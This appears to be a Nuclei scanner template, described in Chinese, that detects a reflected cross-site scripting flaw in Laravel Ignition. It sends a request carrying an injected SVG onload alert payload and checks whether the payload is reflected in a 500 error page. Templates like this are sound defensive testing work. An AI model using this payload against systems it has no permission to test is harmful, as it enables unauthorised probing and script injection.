id: laravel-ignition-xss

info:
  name: Laravel Ignition - 跨站脚本漏洞
  author: 0x_Akoko
  severity: high
  description: Laravel Ignition - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://www.acunetix.com/vulnerabilities/web/laravel-ignition-reflected-cross-site-scripting/
    - https://github.com/facade/ignition/issues/273
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79,CWE-83
  metadata:
    max-request: 1
  tags: laravel,xss,ignition,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Undefined index: --><svg onload=alert(document.domain)> in file"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 500
